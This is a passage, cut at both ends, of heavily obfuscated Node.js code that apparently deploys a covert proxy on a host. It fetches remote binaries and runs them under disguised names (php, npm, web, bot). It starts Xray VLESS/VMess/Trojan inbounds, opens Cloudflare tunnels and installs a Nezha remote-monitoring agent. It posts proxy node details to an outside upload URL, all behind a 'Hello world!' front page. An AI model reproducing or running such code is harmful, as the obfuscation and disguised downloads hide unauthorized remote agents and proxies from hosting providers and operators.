_0x2ff323=_0x399cfd,_0x58b7c0=_0x4367a8[_0x2ff323(0x194)]();console[_0x2ff323(0x115)]('['+_0x5b621f+']\x20'+_0x58b7c0[_0x2ff323(0x287)]()),_0x5b621f==='tunnel'&&this[_0x2ff323(0x28b)+_0x2ff323(0xc7)](_0x58b7c0),(_0x58b7c0[_0x2ff323(0xb0)]('Connected')||_0x58b7c0['includes'](_0x2ff323(0x144))||_0x58b7c0[_0x2ff323(0xb0)](_0x2ff323(0xdf))||_0x58b7c0[_0x2ff323(0xb0)](_0x2ff323(0x275)))&&(console[_0x2ff323(0x115)](_0x5b621f+(_0x2ff323(0x1f4)+_0x2ff323(0x12e)+'y')),this['status'][_0x5b621f]['retries']=0x0);}),_0x359671[_0x399cfd(0x219)]['on'](_0x399cfd(0xfc),_0x4fbb79=>{const _0x115a6c=_0x399cfd;console['error']('['+_0x5b621f+'\x20ERROR]\x20'+_0x4fbb79[_0x115a6c(0x194)]()['trim']());}),_0x359671['on'](_0x399cfd(0xe2),_0x56fc59=>{const _0x4de456=_0x399cfd;console['log'](_0x5b621f+('\x20process\x20e'+'xited\x20with'+'\x20code\x20')+_0x56fc59),this[_0x4de456(0x15d)][_0x5b621f]=null,this['status'][_0x5b621f]['running']=![],this['status'][_0x5b621f][_0x4de456(0xbe)]=new Date()[_0x4de456(0x211)+'g'](),_0x56fc59!==0x0&&_0x56fc59!==null&&(console['log'](_0x5b621f+('\x20exited\x20ab'+_0x4de456(0x191)+_0x4de456(0x163)+'\x20restart..'+'.')),this[_0x4de456(0x1fa)+'start'](_0x5b621f,_0x2a77ab,_0x553e4,_0x422124));}),_0x359671['on']('error',_0x5638be=>{const _0x32cc79=_0x399cfd;console['error']('Failed\x20to\x20'+'start\x20'+_0x5b621f+_0x32cc79(0x9b),_0x5638be),this[_0x32cc79(0x15d)][_0x5b621f]=null,this[_0x32cc79(0x11c)][_0x5b621f]['running']=![],this[_0x32cc79(0x1fa)+_0x32cc79(0x177)](_0x5b621f,_0x2a77ab,_0x553e4,_0x422124);}),this[_0x399cfd(0xe8)](),this[_0x399cfd(0x12f)+'hCheck'](_0x5b621f),_0x4f880c(_0x359671);}catch(_0x4564c8){console[_0x399cfd(0x7f)]('Error\x20star'+_0x399cfd(0x204)+_0x5b621f+':',_0x4564c8),this['scheduleRe'+_0x399cfd(0x177)](_0x5b621f,_0x2a77ab,_0x553e4,_0x422124),_0x1f08a9(_0x4564c8);}});}[_0x3f41d3(0x28b)+'elOutput'](_0x46aa12){const _0xaa6cbc=_0x3f41d3;if(this[_0xaa6cbc(0x14d)]===TUNNEL_TYPES[_0xaa6cbc(0x29a)]){const _0x5345a3=_0x46aa12[_0xaa6cbc(0x1f3)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x5345a3&&_0x5345a3[0x1]){const _0x1902d2=_0x5345a3[0x1];console[_0xaa6cbc(0x115)](_0xaa6cbc(0x18d)+_0xaa6cbc(0xd6)+'ain\x20detect'+_0xaa6cbc(0x27f)+_0x1902d2),this[_0xaa6cbc(0x242)+'in']!==_0x1902d2&&(this[_0xaa6cbc(0x98)+_0xaa6cbc(0x224)](this['tunnelType'],_0x1902d2),setTimeout(()=>{const _0x4c6f6b=_0xaa6cbc;globalThis[_0x4c6f6b(0xd4)+_0x4c6f6b(0x145)]&&globalThis[_0x4c6f6b(0xd4)+'bscription'](_0x1902d2);},0x7d0));}}(_0x46aa12[_0xaa6cbc(0xb0)](_0xaa6cbc(0x132))||_0x46aa12[_0xaa6cbc(0xb0)](_0xaa6cbc(0x144)))&&(console[_0xaa6cbc(0x115)]('Tunnel\x20con'+_0xaa6cbc(0x237)+_0xaa6cbc(0xdb)),this[_0xaa6cbc(0x11c)][_0xaa6cbc(0x1cd)]['retries']=0x0);}[_0x3f41d3(0x1fa)+_0x3f41d3(0x177)](_0x51229a,_0x5e7ae1,_0x1f9c75,_0x16d4bf){const _0x57bdef=_0x3f41d3;this[_0x57bdef(0x208)+_0x57bdef(0x190)][_0x51229a]&&clearTimeout(this['restartTim'+'ers'][_0x51229a]);const _0x127238=this[_0x57bdef(0x11c)][_0x51229a]?.[_0x57bdef(0x175)]||0x0;this['status'][_0x51229a][_0x57bdef(0x175)]=_0x127238+0x1;if(_0x127238>=DAEMON_MAX_RETRIES){console['error'](_0x51229a+(_0x57bdef(0x1dd)+_0x57bdef(0x111)+_0x57bdef(0xae)+'ttempts\x20(')+DAEMON_MAX_RETRIES+')'),setTimeout(()=>{const _0x4566a5=_0x57bdef;this[_0x4566a5(0x11c)][_0x51229a]['retries']=0x0,this['scheduleRe'+'start'](_0x51229a,_0x5e7ae1,_0x1f9c75,_0x16d4bf);},0xea60);return;}const _0x10696a=Math[_0x57bdef(0x19b)](DAEMON_RESTART_DELAY*Math[_0x57bdef(0x162)](0x2,_0x127238),0xea60);console['log']('Scheduling'+'\x20'+_0x51229a+(_0x57bdef(0xa6)+'n\x20')+_0x10696a+('ms\x20(attemp'+'t\x20')+(_0x127238+0x1)+'/'+DAEMON_MAX_RETRIES+')'),this[_0x57bdef(0x208)+_0x57bdef(0x190)][_0x51229a]=setTimeout(async()=>{const _0x23d8e7=_0x57bdef;console[_0x23d8e7(0x115)](_0x23d8e7(0x10b)+'\x20'+_0x51229a+'...');try{await this['startProce'+'ss'](_0x51229a,_0x5e7ae1,_0x1f9c75,_0x16d4bf);}catch(_0x153533){console['error'](_0x23d8e7(0x200)+_0x23d8e7(0x8e)+_0x51229a+':',_0x153533);}},_0x10696a);}[_0x3f41d3(0x12f)+_0x3f41d3(0x16a)](_0x3979b3){const _0x50c34=_0x3f41d3;this[_0x50c34(0x123)+'s'][_0x3979b3]&&clearInterval(this['checkTimer'+'s'][_0x3979b3]),this[_0x50c34(0x123)+'s'][_0x3979b3]=setInterval(()=>{const _0x1e07ee=_0x50c34;this[_0x1e07ee(0x254)+_0x1e07ee(0x157)](_0x3979b3);},DAEMON_CHECK_INTERVAL);}['checkProce'+'ssHealth'](_0xfaf9fc){const _0x34f683=_0x3f41d3,_0x30c04e=this['processes'][_0xfaf9fc];if(!_0x30c04e)return console[_0x34f683(0x115)](_0xfaf9fc+(_0x34f683(0x250)+'ot\x20found,\x20'+_0x34f683(0x11f)+'\x20dead')),this['status'][_0xfaf9fc][_0x34f683(0x18a)]=![],![];try{return process['kill'](_0x30c04e['pid'],0x0),this[_0x34f683(0x11c)][_0xfaf9fc][_0x34f683(0x18a)]=!![],this['saveStatus'](),!![];}catch(_0xee31a3){return console[_0x34f683(0x115)](_0xfaf9fc+(_0x34f683(0x1c0)+_0x34f683(0xc8))+_0x30c04e['pid']+')\x20is\x20dead'),this[_0x34f683(0x11c)][_0xfaf9fc]['running']=![],this['processes'][_0xfaf9fc]=null,![];}}async[_0x3f41d3(0xef)+'cess'](_0x118ef2){const _0x327853=_0x3f41d3;console[_0x327853(0x115)](_0x327853(0xc5)+_0x327853(0xf5)+'sted\x20for\x20'+_0x118ef2);this[_0x327853(0x208)+_0x327853(0x190)][_0x118ef2]&&clearTimeout(this[_0x327853(0x208)+'ers'][_0x118ef2]);this['checkTimer'+'s'][_0x118ef2]&&clearInterval(this[_0x327853(0x123)+'s'][_0x118ef2]);if(this[_0x327853(0x15d)][_0x118ef2]){try{this[_0x327853(0x15d)][_0x118ef2][_0x327853(0xe9)](_0x327853(0x272));}catch(_0x4c7358){}this['processes'][_0x118ef2]=null;}return this['status'][_0x118ef2]['retries']=0x0,this[_0x327853(0xe8)](),!![];}[_0x3f41d3(0x104)+'us'](){const _0x3be8e7=_0x3f41d3;return{'nezha':{...this[_0x3be8e7(0x11c)][_0x3be8e7(0x85)],'name':_0x3be8e7(0x21c)},'xray':{...this[_0x3be8e7(0x11c)][_0x3be8e7(0x21b)],'name':_0x3be8e7(0x1dc)},'tunnel':{...this[_0x3be8e7(0x11c)]['tunnel'],'name':this[_0x3be8e7(0x1d2)+_0x3be8e7(0x116)](),'displayType':this['getTunnelT'+'ypeDisplay']()},'timestamp':new Date()[_0x3be8e7(0x211)+'g'](),'uptime':process[_0x3be8e7(0x101)]()};}['getTunnelD'+_0x3f41d3(0x116)](){const _0x523600=_0x3f41d3;switch(this[_0x523600(0x14d)]){case TUNNEL_TYPES[_0x523600(0x276)]:return _0x523600(0xb8)+_0x523600(0x21e);case TUNNEL_TYPES[_0x523600(0x124)]:return'Cloudflare'+_0x523600(0x125);case TUNNEL_TYPES[_0x523600(0x29a)]:return'Cloudflare'+_0x523600(0x1b3);default:return _0x523600(0xb8)+'隧道';}}[_0x3f41d3(0xe3)+'ypeDisplay'](){const _0x18514f=_0x3f41d3;return this['tunnelType']||_0x18514f(0x203);}['cleanup'](){const _0x42043b=_0x3f41d3;console[_0x42043b(0x115)](_0x42043b(0x127)+'p\x20all\x20daem'+_0x42043b(0xb7)+'es...'),Object[_0x42043b(0x182)](this[_0x42043b(0x123)+'s'])[_0x42043b(0x292)](_0x509a09=>clearInterval(_0x509a09)),Object['values'](this['restartTim'+_0x42043b(0x190)])[_0x42043b(0x292)](_0x561933=>clearTimeout(_0x561933)),Object[_0x42043b(0x1f0)](this[_0x42043b(0x15d)])[_0x42043b(0x292)](_0x250bb5=>{const _0x5736ba=_0x42043b,_0x1a61ef=this[_0x5736ba(0x15d)][_0x250bb5];if(_0x1a61ef){try{_0x1a61ef[_0x5736ba(0xe9)](_0x5736ba(0x272));}catch(_0x47db14){console[_0x5736ba(0x7f)]('Error\x20kill'+_0x5736ba(0x1d7)+_0x250bb5+_0x5736ba(0x9b),_0x47db14);}this[_0x5736ba(0x15d)][_0x250bb5]=null;}this['status'][_0x250bb5][_0x5736ba(0x18a)]=![];}),this[_0x42043b(0xe8)]();}}const daemonManager=new DaemonManager(),proxy=httpProxy['createProx'+_0x3f41d3(0x146)](),proxyServer=http['createServ'+'er']((_0x442ea6,_0xe49ef5)=>{const _0x35fe7f=_0x3f41d3,_0x11eba0=_0x442ea6['url'];_0x11eba0[_0x35fe7f(0x15b)]('/vless-arg'+'o')||_0x11eba0['startsWith']('/vmess-arg'+'o')||_0x11eba0['startsWith'](_0x35fe7f(0x176)+'go')||_0x11eba0===_0x35fe7f(0x284)||_0x11eba0===_0x35fe7f(0x28d)||_0x11eba0==='/trojan'?proxy[_0x35fe7f(0x159)](_0x442ea6,_0xe49ef5,{'target':'http://loc'+_0x35fe7f(0x107)+'1'}):proxy[_0x35fe7f(0x159)](_0x442ea6,_0xe49ef5,{'target':_0x35fe7f(0x10c)+'alhost:'+PORT});});proxyServer['on'](_0x3f41d3(0x251),(_0x333078,_0x1d0051,_0x22ce06)=>{const _0x20e67a=_0x3f41d3,_0x201e70=_0x333078['url'];_0x201e70['startsWith']('/vless-arg'+'o')||_0x201e70[_0x20e67a(0x15b)](_0x20e67a(0x232)+'o')||_0x201e70['startsWith'](_0x20e67a(0x176)+'go')?proxy['ws'](_0x333078,_0x1d0051,_0x22ce06,{'target':'http://loc'+_0x20e67a(0x107)+'1'}):proxy['ws'](_0x333078,_0x1d0051,_0x22ce06,{'target':'http://loc'+_0x20e67a(0x155)+PORT});}),proxyServer[_0x3f41d3(0x8b)](EXTERNAL_PORT,()=>{const _0x59f964=_0x3f41d3;console[_0x59f964(0x115)](_0x59f964(0x13d)+_0x59f964(0x109)+_0x59f964(0xcb)+'t:'+EXTERNAL_PORT+'!'),console['log'](_0x59f964(0x147)+_0x59f964(0xc1)+'lhost:'+PORT),console['log'](_0x59f964(0x82)+_0x59f964(0xc1)+_0x59f964(0x1fb));}),app[_0x3f41d3(0x118)]('/',function(_0x42f38f,_0x2e4f10){const _0x448fcd=_0x3f41d3,_0x2e86a5=path['join'](__dirname,'index.html');fs[_0x448fcd(0x216)](_0x2e86a5)?_0x2e4f10[_0x448fcd(0x1ad)](_0x2e86a5):_0x2e4f10['send']('Hello\x20worl'+'d!');}),app[_0x3f41d3(0x118)]('/daemon-st'+_0x3f41d3(0x1d3),function(_0x3e7716,_0x58e0fc){const _0x1224ed=_0x3f41d3;_0x58e0fc[_0x1224ed(0x241)]({'success':!![],'data':daemonManager['getAllStat'+'us'](),'config':{'checkInterval':DAEMON_CHECK_INTERVAL,'maxRetries':DAEMON_MAX_RETRIES,'restartDelay':DAEMON_RESTART_DELAY}});}),app[_0x3f41d3(0x215)](_0x3f41d3(0xa7)+'process',function(_0x451645,_0x5cd1e3){const _0x12af79=_0x3f41d3,_0x4c597d=_0x451645['params'][_0x12af79(0xb9)],_0x55df14=[_0x12af79(0x85),_0x12af79(0x21b),_0x12af79(0x1cd),'all'];if(!_0x55df14['includes'](_0x4c597d))return _0x5cd1e3[_0x12af79(0x11c)](0x190)['json']({'success':![],'message':_0x12af79(0x257)+'ocess\x20name'+'.\x20Valid\x20op'+_0x12af79(0x1d8)+_0x55df14[_0x12af79(0x2a1)](',\x20')});_0x4c597d===_0x12af79(0x1bc)?(Object['keys'](daemonManager['status'])['forEach'](_0x27333f=>{daemonManager['restartPro'+'cess'](_0x27333f);}),_0x5cd1e3['json']({'success':!![],'message':_0x12af79(0x22e)+_0x12af79(0x154)+_0x12af79(0x24b)+'d'})):(daemonManager[_0x12af79(0xef)+_0x12af79(0x259)](_0x4c597d),_0x5cd1e3['json']({'success':!![],'message':_0x4c597d+(_0x12af79(0xa6)+_0x12af79(0x9c))}));});function deleteNodes(){const _0x1b71af=_0x3f41d3;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0xdc02a9;try{_0xdc02a9=fs[_0x1b71af(0x1f8)+'nc'](subPath,'utf-8');}catch{return null;}const _0x40e358=Buffer['from'](_0xdc02a9,_0x1b71af(0x103))[_0x1b71af(0x194)](_0x1b71af(0x271)),_0x314ada=_0x40e358['split']('\x0a')[_0x1b71af(0xf2)](_0x1e4146=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x1b71af(0x137)](_0x1e4146));if(_0x314ada['length']===0x0)return;return axios['post'](UPLOAD_URL+('/api/delet'+'e-nodes'),JSON[_0x1b71af(0x16e)]({'nodes':_0x314ada}),{'headers':{'Content-Type':_0x1b71af(0x1ef)+_0x1b71af(0x1a4)}})['catch'](_0x362308=>{return null;}),null;}catch(_0x5de419){return null;}}function cleanupOldFiles(){try{const _0x4263aa=fs['readdirSyn'+'c'](FILE_PATH);_0x4263aa['forEach'](_0x36513a=>{const _0x17726b=_0x4d9e,_0x1812fb=path['join'](FILE_PATH,_0x36513a);try{const _0x228e50=fs[_0x17726b(0x1c9)](_0x1812fb);_0x228e50[_0x17726b(0x28f)]()&&_0x36513a!==_0x17726b(0x7d)+_0x17726b(0x1d4)&&fs['unlinkSync'](_0x1812fb);}catch(_0x244caf){}});}catch(_0x4eae86){}}async function generateConfig(){const _0xfbb28c=_0x3f41d3,_0x51784f={'log':{'access':_0xfbb28c(0x210),'error':_0xfbb28c(0x210),'loglevel':_0xfbb28c(0x10e)},'dns':{'servers':[_0xfbb28c(0x27a)+_0xfbb28c(0x1a6)+_0xfbb28c(0xb1)+'y',_0xfbb28c(0x27a)+'l://1.1.1.'+_0xfbb28c(0x19a)+'y','8.8.8.8',_0xfbb28c(0x1af)],'queryStrategy':'UseIP','disableCache':![]},'inbounds':[{'port':0xbb9,'protocol':_0xfbb28c(0x119),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-'+'vision'}],'decryption':'none','fallbacks':[{'dest':0xbba},{'path':'/vless-arg'+'o','dest':0xbbb},{'path':_0xfbb28c(0x232)+'o','dest':0xbbc},{'path':_0xfbb28c(0x176)+'go','dest':0xbbd}]},'streamSettings':{'network':_0xfbb28c(0x23d)}},{'port':0xbba,'listen':_0xfbb28c(0xe4),'protocol':_0xfbb28c(0x119),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0xfbb28c(0x23d),'security':_0xfbb28c(0x10e)}},{'port':0xbbb,'listen':_0xfbb28c(0xe4),'protocol':_0xfbb28c(0x119),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0xfbb28c(0x10e)},'streamSettings':{'network':'ws','security':_0xfbb28c(0x10e),'wsSettings':{'path':_0xfbb28c(0x233)+'o'}},'sniffing':{'enabled':!![],'destOverride':[_0xfbb28c(0x1e2),_0xfbb28c(0x1eb),_0xfbb28c(0x170)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0xfbb28c(0xe4),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0xfbb28c(0x232)+'o'}},'sniffing':{'enabled':!![],'destOverride':[_0xfbb28c(0x1e2),_0xfbb28c(0x1eb),'quic'],'metadataOnly':![]}},{'port':0xbbd,'listen':_0xfbb28c(0xe4),'protocol':_0xfbb28c(0x263),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0xfbb28c(0x10e),'wsSettings':{'path':'/trojan-ar'+'go'}},'sniffing':{'enabled':!![],'destOverride':[_0xfbb28c(0x1e2),_0xfbb28c(0x1eb),'quic'],'metadataOnly':![]}}],'outbounds':[{'protocol':_0xfbb28c(0x18e),'tag':_0xfbb28c(0xec),'settings':{'domainStrategy':'UseIP'}},{'protocol':_0xfbb28c(0x261),'tag':_0xfbb28c(0x11d)}],'routing':{'domainStrategy':'IPIfNonMat'+'ch','rules':[]}};fs[_0xfbb28c(0x153)+_0xfbb28c(0x152)](path['join'](FILE_PATH,_0xfbb28c(0xc6)+'n'),JSON[_0xfbb28c(0x16e)](_0x51784f,null,0x2));}function getSystemArchitecture(){const _0x355e29=_0x3f41d3,_0x25a9fb=os[_0x355e29(0x88)]();return _0x25a9fb===_0x355e29(0x131)||_0x25a9fb===_0x355e29(0xf7)||_0x25a9fb===_0x355e29(0x143)?_0x355e29(0x131):_0x355e29(0x247);}function downloadFile(_0x117bc6,_0x5b5d34,_0x2f2471){const _0x34f66c=_0x3f41d3,_0x4f6ac1=_0x117bc6;!fs['existsSync'](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x506eec=fs['createWrit'+'eStream'](_0x4f6ac1);axios({'method':'get','url':_0x5b5d34,'responseType':_0x34f66c(0x253)})[_0x34f66c(0xb6)](_0x19f596=>{const _0x5d80c8=_0x34f66c;_0x19f596[_0x5d80c8(0xfc)][_0x5d80c8(0x120)](_0x506eec),_0x506eec['on'](_0x5d80c8(0x20f),()=>{const _0x449c02=_0x5d80c8;_0x506eec[_0x449c02(0xe2)](),console[_0x449c02(0x115)]('Download\x20'+path[_0x449c02(0x1d5)](_0x4f6ac1)+('\x20successfu'+_0x449c02(0x112))),_0x2f2471(null,_0x4f6ac1);}),_0x506eec['on'](_0x5d80c8(0x7f),_0x2e29cf=>{const _0x4929ef=_0x5d80c8;fs['unlink'](_0x4f6ac1,()=>{});const _0x25df03=_0x4929ef(0x291)+path[_0x4929ef(0x1d5)](_0x4f6ac1)+_0x4929ef(0x213)+_0x2e29cf[_0x4929ef(0x185)];console[_0x4929ef(0x7f)](_0x25df03),_0x2f2471(_0x25df03);});})['catch'](_0x2e0976=>{const _0x4fd9aa=_0x34f66c,_0x5138e8=_0x4fd9aa(0x291)+path[_0x4fd9aa(0x1d5)](_0x4f6ac1)+'\x20failed:\x20'+_0x2e0976['message'];console['error'](_0x5138e8),_0x2f2471(_0x5138e8);});}async function startNezhaAgent(){const _0x5ab4ce=_0x3f41d3;if(!NEZHA_SERVER||!NEZHA_KEY){console['log'](_0x5ab4ce(0x1ae)+'ables\x20are\x20'+_0x5ab4ce(0x14c)+_0x5ab4ce(0x1e9)+_0x5ab4ce(0x10d));return;}try{let _0x3de489,_0x557ed1;if(!NEZHA_PORT){const _0x54319f=NEZHA_SERVER['includes'](':')?NEZHA_SERVER['split'](':')[_0x5ab4ce(0x290)]():'',_0x16d5d4=new Set(['443',_0x5ab4ce(0x93),_0x5ab4ce(0x186),_0x5ab4ce(0x129),_0x5ab4ce(0xe5),_0x5ab4ce(0x1ca)]),_0x499083=_0x16d5d4[_0x5ab4ce(0x289)](_0x54319f)?_0x5ab4ce(0x299):'false',_0x2e877c='\x0aclient_se'+_0x5ab4ce(0x149)+NEZHA_KEY+(_0x5ab4ce(0x1b9)+'lse\x0adisabl'+_0x5ab4ce(0x11b)+_0x5ab4ce(0x1bf)+'disable_co'+'mmand_exec'+_0x5ab4ce(0x18b)+_0x5ab4ce(0x1a7)+_0x5ab4ce(0xbb)+'e:\x20true\x0adi'+'sable_nat:'+_0x5ab4ce(0x26b)+_0x5ab4ce(0x160)+_0x5ab4ce(0x240)+'se\x0agpu:\x20fa'+_0x5ab4ce(0x172)+'re_tls:\x20tr'+_0x5ab4ce(0x1e4)+_0x5ab4ce(0xa8)+_0x5ab4ce(0x258)+_0x5ab4ce(0x22f)+'4\x0aserver:\x20')+NEZHA_SERVER+(_0x5ab4ce(0x19f)+_0x5ab4ce(0xaa)+'nt:\x20true\x0as'+_0x5ab4ce(0x28a)+'count:\x20tru'+'e\x0atemperat'+_0x5ab4ce(0x24f)+_0x5ab4ce(0xa4))+_0x499083+(_0x5ab4ce(0x27e)+_0x5ab4ce(0x1ab)+_0x5ab4ce(0x252)+'se_ipv6_co'+_0x5ab4ce(0x298)+_0x5ab4ce(0x166)+'id:\x20')+UUID;fs[_0x5ab4ce(0x153)+_0x5ab4ce(0x152)](path['join'](FILE_PATH,_0x5ab4ce(0x168)+'l'),_0x2e877c),_0x3de489=phpPath,_0x557ed1=['-c',FILE_PATH+('/config.ya'+'ml')];}else{let _0x4f9c1a='';const _0x3f6e27=[_0x5ab4ce(0x1db),_0x5ab4ce(0x93),'2096',_0x5ab4ce(0x129),_0x5ab4ce(0xe5),'2053'];_0x3f6e27[_0x5ab4ce(0xb0)](NEZHA_PORT)&&(_0x4f9c1a='--tls'),_0x3de489=npmPath,_0x557ed1=['-s',NEZHA_SERVER+':'+NEZHA_PORT,'-p',NEZHA_KEY,'--disable-'+_0x5ab4ce(0x12a)+'e','--report-d'+_0x5ab4ce(0x282),'4',_0x5ab4ce(0xc4)+'n',_0x5ab4ce(0xed)+'cs'],_0x4f9c1a&&_0x557ed1[_0x5ab4ce(0x1c7)](_0x4f9c1a);}await daemonManager[_0x5ab4ce(0x283)+'ss']('nezha',_0x3de489,_0x557ed1),console['log'](_0x5ab4ce(0x183)+_0x5ab4ce(0xab)+_0x5ab4ce(0x274)+'n');}catch(_0xc3cbb9){console['error'](_0x5ab4ce(0x200)+_0x5ab4ce(0x17c)+_0x5ab4ce(0x239),_0xc3cbb9);}}async function startXray(){const _0x15f150=_0x3f41d3;try{const _0xf9af1d=webPath,_0x3b502=['-c',FILE_PATH+(_0x15f150(0x1c8)+'on')];await daemonManager[_0x15f150(0x283)+'ss']('xray',_0xf9af1d,_0x3b502),console['log'](_0x15f150(0x1fe)+'ed\x20with\x20da'+_0x15f150(0x1d0));}catch(_0x29ca2f){console['error'](_0x15f150(0x200)+'start\x20Xray'+':',_0x29ca2f);}}function analyzeTunnelType(){const _0x548e08=_0x3f41d3;console['log'](_0x548e08(0xa0)+'tunnel\x20con'+_0x548e08(0x1a5)+_0x548e08(0xcd));if(ARGO_AUTH){if(ARGO_AUTH[_0x548e08(0xb0)]('TunnelSecr'+'et'))return console[_0x548e08(0x115)](_0x548e08(0x222)+_0x548e08(0x22a)+'JSON\x20confi'+_0x548e08(0xea)),daemonManager[_0x548e08(0x98)+'nfo'](TUNNEL_TYPES[_0x548e08(0x276)],ARGO_DOMAIN||_0x548e08(0x26e)),TUNNEL_TYPES[_0x548e08(0x276)];else{if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))return console['log'](_0x548e08(0x222)+'e:\x20TOKEN\x20('+_0x548e08(0xa2)+'entication'+')'),daemonManager[_0x548e08(0x98)+_0x548e08(0x224)](TUNNEL_TYPES[_0x548e08(0x124)],ARGO_DOMAIN||_0x548e08(0x26e)),TUNNEL_TYPES[_0x548e08(0x124)];}}return console[_0x548e08(0x115)]('Tunnel\x20typ'+_0x548e08(0x278)+_0x548e08(0xdc)+'tunnel)'),daemonManager[_0x548e08(0x98)+'nfo'](TUNNEL_TYPES['TEMPORARY'],null),TUNNEL_TYPES['TEMPORARY'];}async function prepareTunnelConfig(){const _0x5b393d=_0x3f41d3,_0x511ac0=analyzeTunnelType();switch(_0x511ac0){case TUNNEL_TYPES['FIXED']:try{const _0x5e9e5f=JSON[_0x5b393d(0x206)](ARGO_AUTH),_0x300361=_0x5e9e5f['TunnelID'];fs[_0x5b393d(0x153)+_0x5b393d(0x152)](path['join'](FILE_PATH,_0x5b393d(0xf9)+'n'),ARGO_AUTH);const _0x4e93d3=_0x5b393d(0x27d)+_0x300361+(_0x5b393d(0x198)+_0x5b393d(0x202))+path[_0x5b393d(0x2a1)](FILE_PATH,_0x5b393d(0xf9)+'n')+(_0x5b393d(0x24e)+_0x5b393d(0xfb)+_0x5b393d(0xe0)+_0x5b393d(0x25d)+'\x20')+ARGO_DOMAIN+(_0x5b393d(0xd7)+_0x5b393d(0x150)+'/localhost'+':')+EXTERNAL_PORT+(_0x5b393d(0x1a3)+_0x5b393d(0x256)+_0x5b393d(0x1f1)+_0x5b393d(0x15f)+_0x5b393d(0xca)+'rvice:\x20htt'+'p_status:4'+_0x5b393d(0x173));fs['writeFileS'+'ync'](path['join'](FILE_PATH,_0x5b393d(0xce)),_0x4e93d3),console['log'](_0x5b393d(0x199)+'el\x20configu'+'ration\x20gen'+_0x5b393d(0x1ee)+'cessfully');}catch(_0x367ed0){console['error']('Error\x20gene'+_0x5b393d(0x1a0)+'ed\x20tunnel\x20'+'configurat'+_0x5b393d(0x29c),_0x367ed0);}break;case TUNNEL_TYPES['TOKEN']:console[_0x5b393d(0x115)](_0x5b393d(0x84)+'el\x20require'+_0x5b393d(0x273)+'ional\x20conf'+_0x5b393d(0xf4));break;case TUNNEL_TYPES[_0x5b393d(0x29a)]:console[_0x5b393d(0x115)]('Temporary\x20'+_0x5b393d(0x188)+_0x5b393d(0x151)+'dditional\x20'+_0x5b393d(0x122)+_0x5b393d(0x288));break;}return _0x511ac0;}async function startCloudflaredTunnel(){const _0x470c88=_0x3f41d3;if(!fs['existsSync'](botPath))return console['error'](_0x470c88(0xb8)+_0x470c88(0x1fc)+_0x470c88(0x12c)),null;try{let _0x49d97c;const _0x486a8c=daemonManager[_0x470c88(0x14d)]||TUNNEL_TYPES['TEMPORARY'];switch(_0x486a8c){case TUNNEL_TYPES['FIXED']:if(!fs['existsSync'](path['join'](FILE_PATH,'tunnel.yml')))return console[_0x470c88(0x7f)]('Fixed\x20tunn'+_0x470c88(0xb2)+_0x470c88(0x221)+_0x470c88(0x9d)),null;_0x49d97c=[_0x470c88(0x1cd),'--edge-ip-'+'version',_0x470c88(0x201),_0x470c88(0x86),FILE_PATH+('/tunnel.ym'+'l'),_0x470c88(0x228)],console[_0x470c88(0x115)](_0x470c88(0x164)+_0x470c88(0x286)+'l\x20with\x20YAM'+_0x470c88(0x1aa)+'ation');break;case TUNNEL_TYPES[_0x470c88(0x124)]:_0x49d97c=['tunnel','--edge-ip-'+_0x470c88(0x209),_0x470c88(0x201),_0x470c88(0xfd)+_0x470c88(0x139),'--protocol',_0x470c88(0xda),'run','--token',ARGO_AUTH];ARGO_DOMAIN?(_0x49d97c[_0x470c88(0x1c7)](_0x470c88(0x1d6),ARGO_DOMAIN),console[_0x470c88(0x115)](_0x470c88(0x84)+'el\x20with\x20ho'+'stname:\x20'+ARGO_DOMAIN)):(console['log']('Token\x20tunn'+'el\x20without'+_0x470c88(0x1b0)+_0x470c88(0x22d)+_0x470c88(0x9a)+'are.com)'),_0x49d97c['push'](_0x470c88(0x29e),FILE_PATH+'/boot.log'),_0x49d97c['push'](_0x470c88(0x1f9),_0x470c88(0x214)));console[_0x470c88(0x115)](_0x470c88(0x141)+_0x470c88(0x27c)+'l');break;case TUNNEL_TYPES['TEMPORARY']:default:_0x49d97c=['tunnel',_0x470c88(0x1ec)+'version','auto',_0x470c88(0xfd)+_0x470c88(0x139),_0x470c88(0xc3),_0x470c88(0xda),_0x470c88(0x29e),FILE_PATH+'/boot.log',_0x470c88(0x1f9),'info','--url','http://loc'+_0x470c88(0x155)+EXTERNAL_PORT],console[_0x470c88(0x115)](_0x470c88(0x141)+'emporary\x20t'+_0x470c88(0x21d));break;}return await daemonManager[_0x470c88(0x283)+'ss'](_0x470c88(0x1cd),botPath,_0x49d97c),console['log'](_0x470c88(0xb8)+'d\x20'+_0x486a8c+('\x20tunnel\x20st'+'arted\x20with'+_0x470c88(0xba))),_0x486a8c;}catch(_0x4e7aa0){return console['error'](_0x470c88(0x200)+_0x470c88(0x15a)+'dflared\x20tu'+_0x470c88(0x20d),_0x4e7aa0),null;}}async function downloadFilesAndRun(){const _0x1c510f=_0x3f41d3,_0x436810=getSystemArchitecture(),_0x4c5daa=getFilesForArchitecture(_0x436810);if(_0x4c5daa['length']===0x0){console['log'](_0x1c510f(0x17d)+_0x1c510f(0x134)+'r\x20the\x20curr'+_0x1c510f(0xff)+_0x1c510f(0x1e3));return;}const _0x19d681=_0x4c5daa[_0x1c510f(0x25c)](_0x53d34b=>{return new Promise((_0x375e33,_0x56a9dc)=>{downloadFile(_0x53d34b['fileName'],_0x53d34b['fileUrl'],(_0x48d9c1,_0x34e06e)=>{_0x48d9c1?_0x56a9dc(_0x48d9c1):_0x375e33(_0x34e06e);});});});try{await Promise['all'](_0x19d681);}catch(_0x44ac26){console['error']('Error\x20down'+_0x1c510f(0x108)+_0x1c510f(0xeb),_0x44ac26);return;}function _0x1443af(_0x5d3fb5){const _0x2872d7=_0x1c510f,_0x9b604e=0x1fd;_0x5d3fb5[_0x2872d7(0x292)](_0x2c61cd=>{const 